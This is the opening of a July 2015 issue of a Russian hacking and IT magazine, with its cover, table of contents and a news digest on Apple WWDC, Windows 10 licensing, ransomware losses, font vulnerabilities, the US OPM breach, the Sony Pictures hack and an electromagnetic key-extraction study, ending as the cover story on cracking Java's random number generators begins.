                                                       ИЮЛЬ 2015


              №198



Новые техники
обнаружения
и эксплуатации
XPath/XQuery
injection


Поиграем
в АНБ?





                                                                   Cover
                                                                          StoryСЛУЧАЙНОСТЕЙ
НЕ БЫВАЕТ                                       Что не так с java.util.Random
ВЗЛОМ ГЕНЕРАТОРА           и java.security.SecureRandom                                            в самой энтерпрайзной
СЛУЧАЙНЫХ ЧИСЕЛ JAVA           платформе на свете?
                                           июль 2015
          № 198





  MEGANEWS
Все новое за последний месяц

  СЛУЧАЙНОСТЕЙ НЕ БЫВАЕТ
Взлом генератора случайных чисел Java

  ПРОТОТИПИРУЙ ПРАВИЛЬНО, ВЕРСТАЙ БЫСТРО!
Подборка приятных полезностей для разработчиков

  ПОИСК ГОЛЫМИ РУКАМИ
Используем малоизвестные функции Google, чтобы найти сокрытое

  БАЙТ ИЗ ДРУГИХ МИРОВ
Как ретрокомпьютеры эмулируют на JavaScript

  ПРОСТАК SIMON, ЭЛЕКТРОБЕЛКА И ЗЕМЛЯ БУДУЩЕГО
Как Эдмунд Беркли создал первых роботов и предвосхитил будущее

  ЗВЕРЬ О СЕМИ ГОЛОВАХ
Налаживаем совместную работу смартфона, планшета, Android и iOS

  ОСЬ ДЛЯ РУСИ
Знакомимся с Sailfish, мобильной ОС, выбранной в качестве национальной

  БИТВА ТИТАНОВ
Новшества Android M и iOS 9 Beta с точки зрения гика

  КОЛОНКА ЕВГЕНИЯ ЗОБНИНА
Часы с кукушкой

  КАРМАННЫЙ СОФТ. ВЫПУСК #9
SmartWatch edition

  EASY HACK
Хакерские секреты простых вещей

  ОБЗОР ЭКСПЛОЙТОВ
Анализ свеженьких уязвимостей

  ПЕНТЕСТЫ НА ВИРАЖАХ
ФБР расследует дело о взломе самолета

  СВЕЖИЙ ВЗГЛЯД НА XPATH/XQUERY INJECTION
Новые техники обнаружения и эксплуатации XPath/XQuery injection

  КОЛОНКА ЮРИЯ ГОЛЬЦЕВА
Wardriving в качестве консалтинговой услуги

  ИГРАЕМ В АНБ
Взлом мобильной связи через SS7: перехват SMS, слежка и прочее

  X-TOOLS
Cофт для взлома и безопасности

  КОЛОНКА ДЕНИСА МАКРУШИНА
Наступательная безопасность

  ПОГРУЖЕНИЕ В METASPLOIT. ЧАСТЬ I
Знакомимся с мощным фреймворком для анализа безопасности

  ИНТЕРВЬЮ С СОЗДАТЕЛЕМ GUI ДЛЯ AV
Андрей Федонюк про skillsets, separation of conсerns и митболы

  WI-FI-ДЕТЕКТОР ДЛЯ АНДРОИДА
Сканируем радиоэфир в поисках уязвимых точек доступа

  УМНЫЙ ДОМ НА JAVA
Обзор Netty — крутейшего Java-фреймворка

  АНАЛИЗ ДАННЫХ С ИСПОЛЬЗОВАНИЕМ R
Алгоритмы классификации (часть 1): деревья решений

  PYTHON НА СТЕРОИДАХ
Измеряем производительность наших приложений без потери скорости в продакшене

  ЗАДАЧИ НА СОБЕСЕДОВАНИЯХ
Задачи от компании Acronis и решения задач от Custis

  ЛИЧНАЯ ПЕЩЕРА АЛИ-БАБЫ
Обзор программного NAS OpenMediaVault

  КРИПТОФИЦИРУЕМ FREEBSD
Использование средств криптографической защиты в ОС FreeBSD

  «ПРОДАМ ГАРАЖ!»
Рассматриваем популярные open source решения против спама

  ПУТЬ ВПЕРЕД
Знакомимся с Windows Server Technical Preview 2

  FAQ
Вопросы и ответы

 WWW
Удобные веб-сервисы

  ТИТРЫ
Кто делает этот журнал
                                        Мария «Mifrill» Нефедова
                                                              mifril@real.xakep.ru



                                                         Новость
                                                      месяца




APPLE ОТКРЫВАЕТ
СЕРВИС MUSIC
И ОБНОВИТ
ОПЕРАЦИОНКИ
          а конференции Apple WWDC 2015 было сразу несколько важных анон-
            сов. OS X обновится до версии 10.11 El Capitan, iOS 9 будет поддер-
          живать разделение экрана на айпаде, язык Swift достигнет версии 2.0,
          а его исходные коды откроют. В компании также обновят операцион-
          ную систему watchOS, которая используется в Apple Watch. Сервис
 Apple Music заработает с июля 2015 года в ста странах, включая Россию.Н
   OS X 10.11 вряд ли тянет на революционность. Речь скорее идет о множестве
 небольших, но ценных нововведений. Системный поиск будет лучше понимать
 естественный язык, в Safari можно будет прикреплять вкладки, как в Chrome,
 появится возможность легче разделять экран между двумя приложениями.
    Повысится и производительность. Многие функции будут работать быстрее —
  к примеру, открытие PDF ускорится в четыре раза. Еще большие изменения ждут
 графическую подсистему: в Apple начали процесс перехода с OpenGL на Metal
 (новая графическая система, которая появилась в iOS). Metal позволит прило-
 жениям, которые активно используют графику, работать быстрее и экономить
 до 40% энергии, потребляемой процессором. Компания Adobe уже заявила
 о поддержке новой графической системы в Premiere и Photoshop.
    Наибольшие изменения затронули iOS. Siri теперь будет понимать некото-
 рые команды, связанные с тем, что происходит на телефоне в текущий момент.
 К примеру, просматривая страницу в Safari, можно попросить голосового по-
 мощника напомнить об этой странице в определенное время или в определен-
 ном месте («Напомни мне об этом, когда я приду на работу»). В таком случае
 напоминание будет сопровождаться ссылкой.
    Для пользователей iPad крайне приятна будет новость о том, что, установив
 iOS 9, они смогут разделять экран между двумя приложениями, а также смо-
  треть видео во всплывающем окне. Чтобы разделить экран между текущим при-
 ложением и тем, что использовалось до этого, достаточно провести пальцем
 от края планшета к центру экрана. Второе приложение займет треть рабочего
 пространства, но при желании можно отдать ему и половину (это, правда, до-
 ступно только на iPad Air 2). Переключение приложений в обоих экранах проис-
 ходит независимо.
    Если программа воспроизводит видео, то при переключении в другое при-
 ложение окно с видео теперь можно будет оставить на экране. Выглядит это
 примерно как режим «картинка в картинке», доступный в некоторых телевизо-
  рах. Окно можно двигать и изменять его размеры по своему усмотрению.
   В watchOS 2.0 — новой операционной системе часов Apple — появится под-
 держка полноценных приложений, написанных сторонними разработчиками.
 Помимо этого, добавлено несколько нововведений — к примеру, возможность
 непрерывно отображать время по ходу зарядки. Стабильные версии всех трех
 операционных систем будут доступны осенью, но разработческие бета-версии
 уже вовсю циркулируют в торрентах.
    Важным известием стал и анонс Apple Music. Этот стриминговый сервис до-
 ступен в iOS 8.4 и iTunes 12.2, а осенью появится и приложение для Android.
 В России месячная подписка на Apple Music стоит 169 рублей, а первые три
 месяца бесплатны.





ЛИЦЕНЗИИ
НА WINDOWS 10
РАЗДАДУТ ВСЕМ,
КТО ПОСПЕШИТ
        омпания Microsoft опубликовала в своем блоге сообщение, которое
        может обрадовать всех пользователей, которые уже отчаялись полу-
          чить лицензионную версию Windows 10 даром. Ранее компания зая-
          вила, что обладатели лицензионных версий Windows 7 и Windows 8.1
         смогут установить ее совершенно бесплатно, а теперь к веселью при-
 глашаются даже те, у кого нет лицензионной Windows.К
    Как ее заполучить? Во-первых, создать учетную запись Microsoft, если ее
 еще нет. Во-вторых, зарегистрироваться в программе предварительной оценки
 Windows (Windows Insider Preview). Используй для этого созданный ранее акка-
  унт Microsoft. В-третьих, скачать Windows 10 Insider Preview и установить его. Об-
 рати внимание на то, что после выхода финальной версии тестовая уже не будет
  доступна. Еще важно помнить, что присутствует привязка к железу, так что уста-
 новить несколько копий Windows 10 на разные компьютеры не получится.
    Когда со всем перечисленным будет покончено, можно просто использо-
  вать Windows 10 Insider Preview и ждать официального релиза 29 июля. После
 его установки и активации можно будет в дальнейшем произвести чистую уста-
 новку системы, если понадобится начать все заново.





ВЫМОГАТЕЛИ
ЗАРАБОТАЛИ
НА CRYPTOWALL
18 МИЛЛИОНОВ
ДОЛЛАРОВ
            ентр приема жалоб на мошенничество в интернете собрал в со-
            трудничестве с ФБР статистику о действиях программ-вымогателей
           на территории в США в период с апреля 2014 года по июнь 2015-
              го. Согласно документу, самым популярным вымогателем-шиф-
           ровальщиком оказался CryptoWall и различные его модификации.
           Нанесенный зловредом ущерб за указанный период составилЦ
 18 миллионов долларов.
   ФБР отмечает, что такую малварь становится все труднее отслеживать. Ко-
 мандные серверы вымогательского ПО все чаще размещаются в даркнете,
 где их сложно обнаружить и еще сложнее деактивировать. Кроме того, выкуп
 за расшифровку файлов теперь, как правило, требуют в Bitcoin, что гораздо бы-
 стрее банковского платежа и, конечно, гораздо сложнее проследить.
    За прошедший год специалисты центра получили почти около тысячи жалоб
 на CryptoWall и родственное ему ПО. Сумма выкупа в разных случаях варьи-
 руется в диапазоне от 200 до 10 000 долларов. Документ отмечает, что траты
 жертв подобных атак обычно не ограничиваются одним лишь выкупом: после
 атаки им приходится тратиться на услуги специалистов по безопасности, вос-
 становление системы, юристов и тому подобные вещи.




                    «Наша миссия — помочь каждой
                      организации и каждому человеку
                      на этой планете достичь большего.
                     Это очень амбициозная задача,
                       в сердце которой лежат желания
                     наших пользователей. У нас
                        есть уникальная возможность
                      гармонизировать нужды частных
                       пользователей и организаций.
                     Это — наша ДНК».

                                                                                Сатья Наделла,
                                                          из отрытого письма
                                                              к сотрудникам Microsoft

ШРИФТЫ СТАЛИ
УГРОЗОЙ
БЕЗОПАСНОСТИ
          акер Матеуш Юрчик  (Mateusz «j00ru» Jurczyk)  из подразделения
         Google Project Zero выступил с докладом на конференции Recon 2015
          в Монреале, где рассказал о важной дыре в компьютерной безопас-
          ности — шрифтах. Он раскрыл пятнадцать серьезных уязвимостей
          в Windows и Adobe Reader при рендеринге шрифтов, в том числе по-
 казал хак, который обходит все механизмы защиты от эксплоитов.Х
    «Исключительно мощный примитив, который дает эта уязвимость, — гово-
 рит Юрчик, — сочетается с тем фактом, что она присутствует во всех совмести-
 мых версиях Adobe Reader и Microsoft Windows (32-bit). Можно сделать цепоч-
  ку эксплоитов, которая ведет к полной компрометации системы всего с одной
 уязвимостью. Все это делает находку одной из самых интересных проблем
 в безопасности, с которой я сталкивался до сих пор».
    Юрчик опубликовал видеодемонстрацию эксплоита для 32- и 64-битных
 систем (CVE-2015—3052 и CVE-2015—0093), доступны и слайды из его пре-
 зентации.
    Две указанные уязвимости используют модуль Adobe Type Manager Font
  Driver  (ATMFD.dll), который поддерживает шрифты Type 1 и Type 2 в ядре
 Windows со времен Windows NT 4.0.
    Юрчик сообщает, что его «абсолютно надежный» эксплоит на BLEND-ин-
 струкциях связан с обработкой драйвером CharStrings, который отвечает
 за рендеринг очертаний каждого глифа для заданного размера шрифта.



                    4 000 000 000  75%
      дохода Google                 заработали
   от мобильной рекламы           «Одноклассники»
  генерируют iPhone и iPad        на стикерах и подарках
       Компания Goldman Sachs со-                     Согласно сообщению издания
    общает, что в 2014 году Google за-                РБК, виртуальные наклейки и подарки
    работала на поисковой рекламе 59                 в 2014 году позволили «Одноклассни-
    миллиардов долларов. Около 20%                 кам» заработать более четырех мил-
    этой суммы (11,8 миллиарда) корпо-              лиардов рублей. Примечательно и то,
    рации принесла поисковая реклама                 что это крупнейшая статья доходов
    на мобильных устройствах. Из этих                компании, потеснившая даже игры,
    11,8 миллиарда 8,8 миллиарда дол-              занимающие второе место, и рекла-
    ларов компании обеспечили пользо-                му, которая, соответственно, нахо-
    вали устройств с iOS на борту. При-                дится на третьей позиции.
    мерно половину этой суммы, то есть
     4,4 миллиарда, нужно отнести на счет
    сделки с Apple, заключенной в 2013
     году, согласно которой поисковая
    система Google является поиском
    по умолчанию для iOS-устройств.





ДВА ГОДА ПОСЛЕ
СЛИЯНИЯ:
ИЗ MICROSOFT
УВОЛИЛИ ЭЛОПА,
А NOKIA СНОВА
БУДЕТ ДЕЛАТЬ
ТЕЛЕФОНЫ
          сентябре 2013 года подразделение мобильных устройств Nokia офи-
          циально перешло к компании Microsoft вместе с бывшим выходцем
          из той же Microsoft Стивеном Элопом. Не прошло и двух лет, и Элоп
          покидает стены Microsoft, а в Nokia снова задумываются о том, чтобы
           выпускать под своей маркой мобильные телефоны.
   В Microsoft недавно была объявлена значительная реструктуризация сре-В
 ди руководящего менеджмента. Помимо Элопа, компанию оставят Джо Хар-
  лоу, ранее занимавшая руководящий пост в Nokia, а в Microsoft возглавлявшая
 подразделение смартфонов, и Кирилл Татаринов — исполнительный директор
 по бизнес-решениям.
    Столь радикальные кадровые перемены — отражение новой стратегии ком-
 пании. Microsoft фокусируется на трех основных направлениях: инструментах
 для бизнеса и повышения продуктивности, облачных платформах и персональ-
 ных компьютерах. Происходит не только смена руководящих лиц, но и реструк-
 туризация подразделений. Так, из команд Operating Systems Group и Microsoft
 Devices Group будет создано единое подразделение Windows and Devices
 Group.
    Когда Элоп перешел из Microsoft в Nokia и начал готовить компанию к про-
 даже, многие заподозрили в этих действиях сложную многоходовку Microsoft,
 в которой Элоп выступал в роли троянского коня. Умышленно разрушив бизнес
  Nokia, он продал его Microsoft за 5,4 миллиарда евро, благополучно вернув-
 шись туда на работу. После покупки Nokia Элоп вместе с Джо Харлоу занимал-
 ся интеграцией остатков финского бизнеса в структуру корпорации. Именно
  этих людей нужно благодарить за то, что Nokia отказалась от своих телефонов
 в пользу Windows Phone.
    Теперь, когда интеграция Nokia в состав Microsoft окончена, объявлено, что
 компания больше не нуждается в услугах Элопа. «Мы со Стивеном согласи-
  лись, что сейчас подходящее для него время покинуть Microsoft. Я сожалею
 о потере такого руководителя, но мне не терпится узнать, куда он отправится
  теперь», — написал гендиректор Microsoft Сатья Наделла в открытом письме
  к сотрудникам.
    Возможно, впрочем, и что руководство Nokia вело более долгую игру и в ито-
  ге окажется в плюсе. Нынешний исполнительный директор Nokia Раджив Сури
 недавно поделился планами компании на будущее: в 2016 году истечет срок
 действия соглашения, подписанного с Microsoft и запрещающего Nokia до чет-
 вертого квартала будущего года выпускать телефоны под своим брендом. Как
 только этот момент настанет, Nokia намерена вернуться к корням — на рынок
 сотовых телефонов.
   «Мы будем искать подходящих партнеров. Microsoft выпускает мобиль-
 ные телефоны. Мы могли бы проектировать их, а затем продавать лицензии
 на бренд», — заявил Сури. Не исключено, что это станет первым шагом на пути
  к перерождению Nokia.




                  «Машины будут умнее нас, а если они
                       будут умнее нас, они осознают, что мы
                  им нужны. На самом деле все должно
                     обернуться для людей хорошо. Пройдут
                  еще сотни лет, прежде чем машины до-
                        стигнут такого уровня. Но когда это слу-
                        чится, они будут умны и будут понимать,
                       что должны сохранить природу и людей
                        как часть этой природы. Я перерос свои
                      страхи относительно того, что всех нас
                     заменят компьютеры. Они нам помогут».

                                                                                     Стивен Возняк
                                                               о проблеме ИИ





ПЛАНШЕТ PWN PAD 3
СОЗДАН ЛЯ ВЗЛОМА
        омпания Pwnie Express широко известна в узких кругах как изготови-
         тель различных «шпионских» гаджетов для скрытого пентестинга, то
         есть для проверки сети на уязвимости без ведома сотрудников ком-
         пании. Заходим в офис, оставляем прибор, замаскированный под ро-
          зетку или удлинитель, и он собирает всю нужную информацию. Сей-
 час хакерская компания выпустила третью модель планшета Pwn Pad — своегоК
 флагманского продукта для мобильного пентестинга.
    Pwn Pad 3 сделан на базе Nvidia Shield, так что с аппаратной точки зрения
 устройство мощное: 2 Гбайт ОЗУ и процессор Cortex A15, который работает
 на частоте 2,2 ГГц. Это соответствует уровню ноутбуков примерно пятилетней
 давности.
    Важно, что на Pwn Pad 3 заранее установили необходимое программное
 обеспечение. Производитель тщательно подходит к выбору программ и посте-
 пенно улучшает и обновляет список программ для ОС Kali Linux. Сейчас в спи-
 сок добавили Kali Disk Forensics для анализа жестких дисков. Внешний диск
 нужно подключить напрямую через USB-кабель, монтировать — и он станет до-
 ступен для утилит из хакерского комплекта.
    Для подключения периферии в комплекте с планшетом идет кабель OTG.
 Еще одним нововведением в Pwn Pad 3 стала функция обновления «по воз-
  духу». Раньше приходилось вручную менять прошивку, сейчас она приходит
 и устанавливается автоматически.
    Новая версия комплекта (он включает внешние адаптеры Bluetooth, Wi-Fi,
  Ethernet и кабель OTG, на фото вверху) стоит немало: 1095 долларов. Зато
 и удовольствия-то сколько!





АРМИЯ США
ПОКУПАЕТ
ПОДДЕРЖКУ
WINDOWS XP
ЗА МИЛЛИОНЫ
ДОЛЛАРОВ
          оддержка Windows XP была полностью прекращена весной 2014 года,
          но система по-прежнему установлена на множестве машин по всему
           миру: от банкоматов до, как оказалось, армии США. Причем амери-
           канская армия страдает от окончания поддержки настолько сильно,
           что военным пришлось заплатить Microsoft немалую сумму. Продол-
 жение поддержки и новые обновления безопасности для Windows XP, OfficeП
 2003, Exchange 2003 и Windows Server 2003 обошлись в 9,1 миллиона долларов.
    Издание ZDNet сообщает, что контракт с Microsoft заключили военно-мор-
 ские силы США (в лице Центра управления системами воздушных и морских
 войск — SPAWAR). Дело в том, что ВМС до сих пор имеют на руках более 100
 тысяч компьютеров, которые работают под управлением Windows XP. Хотя ми-
 грация на другие ОС давно началась, военные не успели завершить этот про-
 цесс в срок и теперь вынуждены как-то поддерживать этот немалый парк тех-
  ники.
    Эксперты ВМС ожидают, что миграция завершится в июле 2016 года. Де-
 вятью миллионами военные оплатили Microsoft еще год поддержки указанных
 выше продуктов. Однако по менее оптимистичным прогнозам переход на дру-
 гое ПО может затянуться вплоть до 2017 года. За этот срок ВМС придется вы-
 платить софтверному гиганту уже порядка 31 миллиона долларов.
   ВМС США — не первая организация, которая поступает подобным обра-
 зом. К примеру, в 2014 году аналогичный контракт с Microsoft подписало пра-
 вительство Великобритании, заплатив за поддержку 20 тысяч ПК с Windows XP
 около 5,6 миллиона фунтов стерлингов.
ХАКЕРЫ УЗНАЛИ
ПОДРОБНОСТИ
ЛИЧНОЙ ЖИЗНИ
ГОССЛУЖАЩИХ
США
        рупный взлом Службы управления персоналом США затронул по мень-
       шей мере четыре миллиона человек (по другим данным, до 18 милли-
        онов госслужащих). И утекли вовсе не логины, пароли и номера бан-
         ковских карт, а практически полная биография этих людей: данные
        о сексуальных партнерах и проблемах в браке, история употребления
 наркотиков и алкоголя, сведения о долгах и пристрастиях к азартным играм,К
 информация о судимостях и преступной деятельности.
    Атака произошла в декабре 2014 года, но оставалась незамеченной вплоть
 до весны 2015 года. Ее можно считать одной из худших в истории США: даже
 высокопоставленные американские чиновники признали, что иностранные ха-
 керы (предположительно — китайские) заполучили личные данные множества
 сотрудников, в том числе агентов разведки и военного персонала, работников
 ЦРУ, АНБ и военных спецподразделений.
    Три бывших сотрудника спецслужб подтвердили изданию Daily Beast, что все
 эти досье собирают на бывших и нынешних государственных служащих и под-
 рядчиков сами власти. С особой тщательностью проверяют людей и компании,
 которым нужен допуск к секретным материалам. На сбор этих данных ушли годы.
 Произошедшая утечка дает иностранным разведкам фактически готовый план
 действий, как найти таких людей и через них получить доступ к самым охраня-
 емым секретам правительства. В руках спецслужб оказались мощные рычаги
 давления. Пострадавших могут попытаться как завербовать, так и попросту из-
 ловить и подвергнуть допросам.
   Помимо относительно безобидных «форм 86», в руки хакеров попали пол-
 ные досье, включающие биографические данные и проверки бэкграунда, а так-
 же результаты интервью на полиграфе. Один из источников Daily Beast расска-
  зал, что в ходе интервью на полиграфе его однажды спросили, практиковал ли
 он когда-нибудь зоофилию. Чтобы составить представление о том, насколько
 доскональны эти проверки, в Сети можно найти примеры результатов, где име-
 на претендентов не раскрываются.
    К примеру, один из соискателей признал, что однажды прострелил ногу сво-
 ему девятнадцатилетнему сыну во время ссоры, возникшей из-за того, что сын
 хотел привести девушку в дом, где соискатель проживал со своей бабушкой.
 Другой претендент 25 лет прослужил в армии и признался, что на протяже-
 нии почти всего этого времени имел роман с женой своего бывшего соседа
 по комнате: «Наши отношения то возобновлялись, то прекращались в течение
 двадцати лет». Еще один кандидат на работу «мог похвастаться» долгом в 1,8
 миллиона долларов — в числе прочего он выплачивал четыре ипотеки за три
 кондоминиума. Кому-то допуск одобряют при условии, что он перестанет пить,
  хотя ранее данный соискатель четырежды лечился от алкогольной зависимо-
  сти, но каждый раз все заканчивалось рецидивом.
    Столь подробные досье на 18 миллионов человек, обладающих доступом
  к государственным секретам, действительно могут стать подарком для спец-
 служб, шпионов, хакеров и шантажистов всего мира.





 Вышел          Компьютер-     Группа         Опубликованы
 джейлбрейк     флешка        Anonymous      первые резуль-
 для iOS 8.3 и 8.4  Lenovo          атаковала       таты по «делу
 Китайская хакер-   Компания Lenovo  правительство   о голых знаме-
 ская группа TaiG   анонсирова-     Канады          нитостях»
 выпустила джей-   ла свой вари-     Не только пра-    Прошлым летом
 лбрейк для по-     ант компьюте-     вительство США   весь интернет
 следних версий    ра-флешки,        страдает от ки-    обсуждал утек-
  iOS. Программа    которая встав-     бератак. Ка-      шие личные фо-
 работает только    ляется в разъем    надские власти    тографии многих
 в Windows и тре-   HDMI монитора    подтвердили,      женщин-звезд
 бует предвари-    или телевизора.    что стали жерт-    во главе с Джен-
 тельно деактиви-   Ideacenter Stick    вой хакерской     нифер Лоуренс.
 ровать Touch ID    300 поставляет-    атаки, которая     Теперь прессе
 и Find My iPhone    ся с Windows 8.1,   вывела из строя    удалось заполу-
 (после установки   которую можно     практически все    чить отчет ФБР,
 их можно будет     будет обновить    сетевые предста-  где говорится,
  вернуть). Заодно   до Windows 10.     вительства феде-  что 15 октября
 с джейлбрейком   Миниатюрный     ральных учреж-    2014 года был
 можно установить  компьютер сто-    дений страны.     проведен обыск
 и репозиторий     ит 129 долла-      Сообщается, что   у подозревае-
  Cydia. Обычно     ров — дешевле    атака не затрону-  мого Эмилио
 Apple быстро вы-    Intel Compute      ла конфиденци-    Эрреры, жителя
 пускает патч, ко-    Stick, но дороже   альные данные —  Бостона. С IP-а-
 торый снова де-    Chromebit. Зато    хакеры лишь      дреса его дома
 лает джейлбрейк   характеристики    вывели из строя   было предприня-
 невозможным,     на уровне: Atom    сайты при по-      то около десяти
 однако китайские   Baytrail, 2 Гбайт   мощи DDoS.       тысяч попыток
 хакеры быстро     памяти, 32 Гбайт   Ответственность   подключиться
 отреагировали    флеш, динамик,    за атаку на себя    к iCloud и по-
 на обновление      Wi-Fi, Bluetooth,    взяли Anonymous,  лучить доступ
 iOS до 8.4 и бы-    micro-USB 2.0     опубликовав со-    к более чем 2,5
 стро модифици-   и разъем для карт  ответствующее    тысячи аккаунтов.
 ровали свой софт  SD. Подключа-     видео (или кто-    Пока не ясно,
 для ее поддерж-   ем беспрово-      то решил прима-   все ли результа-
  ки. Однако взлом  дные клавиатуру    заться к славе).    ты были опубли-
 грядущей iOS 9    и мышь, работа-   В ролике гово-     кованы взломщи-
 снова может за-   ем как за полно-    рится, что это      ком, или что-то
  тянуться на дол-   ценным деск-      ответ на недавно   он оставил себе.
 гие месяцы.        топом, а потом     принятый в Кана-
                  убираем ком-     де закон, кото-
                  пьютер в карман   рый, по мнению
                  и уносим с собой.  хакеров, наруша-
                                        ет права челове-
                                              ка. Закон расши-
                                      ряет полномочия
                                  службы безопас-
                                     ности и разведки,
                                     облегчая задачу
                                    слежки за част-
                                ными лицами.





ЭЛЕКТРОМАГНИТНАЯ
АТАКА ИЗВЛЕКАЕТ
КЛЮЧИ ШИФРОВА-
НИЯ ИЗ НОУТБУКА
          нженеры из лаборатории экспериментальной информационной
           безопасности (LEISec) в Тель-Авивском университете продемон-
           стрировали бюджетную электромагнитную атаку, которая позволила
           извлечь секретные ключи шифрования с ноутбука при помощи за-
          меров электромагнитного излучения в течение нескольких секунд
 с расстояния 50 см. Атака может быть проведена с использованием общедо-И
 ступного оборудования: потребительского радиоприемника или USB-модуля
 с программно определяемой радиосистемой (SDR) .
    Из этого оборудования изготавливается компактное устройство, которое
 работает от четырех батареек. Его просто замаскировать под какой-нибудь
 предмет и оставить работать в скрытом режиме. Для атаки уязвимы обычные
 ноутбуки и популярные реализации шифров RSA и ElGamal. В качестве демон-
 страции исследователи провели атаку на разные модели ноутбуков с популяр-
 ным криптографическим пакетом GnuPG, использующим стандарт OpenPGP.
    Атака предполагает отправку нескольких тщательно составленных шифро-
  вок, расшифровка которых вызывает последовательность определенных зна-
 чений в шифровальной программе, что детектируется через флуктуации элек-
 тромагнитного поля в районе 1,7 МГц. Биты секретного ключа шифрования
 восстанавливаются путем обработки сигналов и криптоанализа. Исследовате-
 ли отмечают, что при использовании более качественной антенны, усилителя
 и дигитайзера можно увеличить расстояние до ноутбука жертвы.




                     «Сегодня Telegram ежемесячно сжигает
                    миллион долларов. Может показаться,
                       что это ведет в тупик, но, если
                     ты хочешь выстроить бизнес-модель,
                     сначала нужно вырасти до приличных
                     размеров. На данный момент у Telegram
                    62 миллиона пользователей, и это уже
                      достаточная база, чтобы привлечь
                     сторонних разработчиков для создания
                      продуктов под нашу платформу»

                                                                         Павел Дуров о Telegram





ИЗ-ЗА ВЗЛОМА
СОТРУДНИКИ SONY
ПЕРЕШЛИ НА ФАКСЫ
И ДРУГИЕ ДРЕВНИЕ
ТЕХНОЛОГИИ
          ноябре 2014 года всем было понятно, что Sony Pictures пришлось нес-
           ладко. Офисные компьютеры и серверы компании вышли из строя,
          и в течение долгого времени админы не могли поднять систему. Жур-
          нал Fortune недавно опубликовал репортаж, который описывает тот
           ужас, в котором оказались офисные сотрудники компании. Им при-
 шлось продолжать работу без компьютеров. Фактически в один день они ока-В
 зались отброшены на двадцать лет назад в истории: ни компьютеров, ни элек-
 тронной почты, ни офисных программ, ни интернета.
    Первые сотрудники, которые пришли в офис 24 ноября и попытались за-
  грузить компьютеры, вместо привычной формы авторизации услышали зву-
 ки стрельбы. На мониторах появился скелет и текст с угрозами. До того как
 ИТ-персонал успел опомниться, зловред распространился по сети между все-
 ми офисами Sony Pictures и полностью удалил информацию на 3262 из 6797
 персональных компьютеров и на 837 из 1555 имеющихся серверов. Чтобы дан-
 ные наверняка нельзя было восстановить, хакеры добавили алгоритм, который
 перезаписывал секторы дисков семью разными способами.
    Сотрудникам пришлось снова вернуться к забытым факсимильным аппара-
 там и бумажной почте, а зарплату выдали бумажными чеками. Всё как в старые
 добрые девяностые.
   И это было только начало кошмара. Вскоре в открытом доступе оказался
 большой архив документов компании: от незаконченных сценариев и оскорби-
 тельных электронных писем до зарплатных ведомостей и более 47 тысяч но-
 меров социального страхования. Пять фильмов Sony, в том числе четыре еще
 не вышедших на экраны, попали на пиратские трекеры.
   По словам представителей Sony, компания стала безвинной жертвой взло-
 ма. В декабрьском интервью исполнительный директор Майкл Линтон сказал,
  что его компания была «чрезвычайно хорошо подготовлена в области инфор-
 мационной безопасности», но столкнулась со «слишком утонченной атакой»,
 «худшей кибератакой в американской истории». Естественно, в компании
 не могло быть виноватых, никого так и не уволили.
   Но репортаж дает понять, что уровень некомпетентности отдела безопас-
 ности Sony Pictures просто кошмарный. Например, 3 ноября 2014 года они
 пригласили на встречу четырех ИТ-специалистов из частной компании Norse,
 профессионалов в области взлома. С ними хотели проконсультироваться на-
 счет хакеров, которые доставали Sony Pictures уже несколько лет. После фор-
 мального осмотра специалистов завели в кабинет директора по безопасности
 и оставили одних на пятнадцать минут. Рядом с компьютерами, залогиненными
 и подключенными к локальной сети.
    Ребятам из Norse все сразу стало понятно. Но было поздно. К этому вре-
 мени неизвестные злоумышленники уже полгода орудовали на серверах Sony
  Pictures, оставаясь незамеченными и готовясь к дню Х, когда они вырубили все,
 до чего смогли дотянуться.





 Popcorn Time    Google будет    Американские   «Флибусту»
 переделали      хостить репози-  ИТ-компании    закрыли из-за
 для просмотра   тории          потеряют более  книг Брэдбери
 порно           Компания Google  35 миллиардов   Крупнейшая
 Известный виде-   начала предо-    долларов из-за   книжная библи-
 оплеер Popcorn    ставлять за-      шпионажа АНБ   отека Рунета
  Time, опираю-     казчикам об-      Аналитики Фонда   все-таки угодила
 щийся на рас-     лачных услуг      информацион-     в реестр запре-
 пределенные      бесплатный до-    ных технологий    щенных сайтов.
 технологии, пе-    ступ к бета-вер-   и инноваций      Причиной послу-
 ределали в сред-  сии Cloud Source    (ITIF) сообщают,   жил иск изда-
 ство просмотра    Repositories —     что зарубежные    тельства «Эксмо»
 порнографии.     нового сервиса    клиенты повсе-     из-за наруше-
 Порнофорк полу-  для хранения      местно избегают   ния авторских
 чил имя Porn Time  и редактирова-    американских     прав на книги
  (http://porntime.    ния исходного     компаний и ис-    Рэя Брэдбери.
  ws), он бази-       кода. В каком-то   пользуют слежку   По иронии судь-
 руется на коде    смысле этот       американских     бы (или по за-
 Popcorn Time      сервис можно     спецслужб как     думке адвока-
 и работает точно   назвать альтер-    повод для приня-   тов «Эксмо»)
  так же, как его     нативой GitHub,    тия новых протек-  в списке из че-
 прародитель, —    хотя сравнивать    ционистских за-    тырех книг есть
 позволяет вы-      их сложно, ведь    конов. Прибыль,   и «451 градус
 брать любую       GitHub — это еще  которую из-за     по Фаренгейту».
 кинокартину и на-  и полноценная     этого потеряли     Так как выбо-
 чинать смотреть:   социальная сеть   американские     рочно блокиро-
 фильм будет       для программи-   фирмы, оценива-   вать страницы
 докачивать-        стов. Вряд ли     ют в сумму от 22   провайдеры пока
 ся по BitTorrent    Google всерьез    до 35 милли-      не умеют, сайт
 по ходу просмо-   рассчитыва-       ардов долла-      полностью по-
  тра. Скорость      ет переманить     ров за три года.    пал под запрет.
 зависит от ко-     пользователей    Один из опро-       Twitter библиоте-
 личества лю-       GitHub. Скорее    сов показал, что    ки отреагировал
 дей на раздаче,    всего, это просто  25% компаний     на происходящее
 но у порно с этим  дополнительная   Великобритании   спокойно: «Нас?
 вряд ли возник-    опция для удоб-   и Канады плани-   Закрыли? Мы
  нут проблемы.     ства нынешних     руют изъять свои   работаем, как ра-
                     клиентов.         данные с терри-    ботали. Это ВАС
                                    тории США в ре-   закрыли внутри
                                        зультате сканда-   Рунета… Ищите
                                     ла с тотальной     пути обхода,
                                   прослушкой        их много, и они
                                   коммуникаций     просты».
                                   со стороны АНБ.
 Coverstory





    Михаил Егоров
        goo.gl/75ivTy





    Сергей Солдатов
       goo.gl/Os9Xky




СЛУЧАЙНОСТЕЙ
НЕ БЫВАЕТ
ВЗЛОМ ГЕНЕРАТОРА СЛУЧАЙНЫХ ЧИСЕЛ JAVA

Что не так с java.util.Random и java.security.SecureRandom
в самой энтерпрайзной платформе на свете?




ВВЕДЕНИЕ
